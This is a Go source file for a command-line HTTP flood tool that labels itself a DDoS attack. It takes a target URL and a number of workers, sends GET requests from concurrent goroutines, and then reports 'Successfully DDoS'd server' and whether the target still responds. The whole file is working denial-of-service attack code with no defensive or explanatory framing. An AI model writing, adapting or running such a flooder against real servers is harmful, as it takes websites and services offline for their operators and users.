package main

import (
  "fmt"
  "io"
  "io/ioutil"
  "net/http"
  "net/url"
  "runtime"
  "sync/atomic"
  "time"
  "os"
  "strconv"
)

// DDoS - structure of value for DDoS attack
type DDoS struct {
  url string
  stop * chan bool
  amountWorkers int

  // Statistic
  successRequest int64
  amountRequests int64
}

// New - initialization of new DDoS attack
func New(URL string, workers int)( * DDoS, error) {
  if workers < 1 {
    return nil, fmt.Errorf("Amount of workers cannot be less 1")
  }
  u, err := url.Parse(URL)
  if err != nil || len(u.Host) == 0 {
    return nil, fmt.Errorf("Undefined host or error = %v", err)
  }
  s := make(chan bool)
  return &DDoS {
    url: URL,
    stop: & s,
    amountWorkers: workers,
  }, nil
}

// Run - run DDoS attack
func(d * DDoS) Run() {
  now := time.Now().Unix()
  for i := 0;
  i < d.amountWorkers;
  i++ {
	go func() {
      for {
        select {
          case <-( * d.stop):
            return
          default:
            // sent http GET requests
            resp, err := http.Get(d.url)
            atomic.AddInt64( & d.amountRequests, 1)
            if err == nil {
              atomic.AddInt64( & d.successRequest, 1)
              _, _ = io.Copy(ioutil.Discard, resp.Body)
              _ = resp.Body.Close()
            }
        }
		runtime.Gosched()
		fmt.Printf("\r=> Working... %v seconds elapsed.", time.Now().Unix() - now)
      }
	}()
  }
}

// Stop - stop DDoS attack
func(d * DDoS) Stop() {
  for i := 0;
  i < d.amountWorkers;
  i++ {
    ( * d.stop) <- true
  }
  close( * d.stop)
}

// Result - result of DDoS attack
func(d DDoS) Result()(successRequest, amountRequests int64) {
  return d.successRequest, d.amountRequests
}

type block struct {
	try     func()
	catch   func(exception)
	finally func()
}

type exception interface{}

func throw(up exception) {
	panic(up)
}

func (tcf block) do() {
	if tcf.finally != nil {
		defer tcf.finally()
	}
	if tcf.catch != nil {
		defer func() {
			if r := recover(); r != nil {
				tcf.catch(r)
			}
		}()
	}
	tcf.try()
}

func main() {
  target := ""
  workers := 0
  block{
    try: func() {
      target = os.Args[1]
      workers, _ = strconv.Atoi(os.Args[2])
    },
    catch: func(e exception) {
	  //fmt.Printf("Caught %v\n", e)
	  fmt.Printf("Please add <host> and <amount>.\n")
	  os.Exit(1)
    },
    finally: func() {},
  }.do()

  d, err := New(target, workers)
  if err != nil {
    panic(err)
  }
  d.Run()
  time.Sleep(time.Second)
  d.Stop()
  fmt.Println("\nSuccessfully DDoS'd server.")

  // Check if site is up
  resp, err := http.Get(target)
  if err != nil {
    print(err.Error())
  } else {
    print(string(resp.StatusCode) + resp.Status)
  }
  // Output: DDoS attack server: http://127.0.0.1:80
}
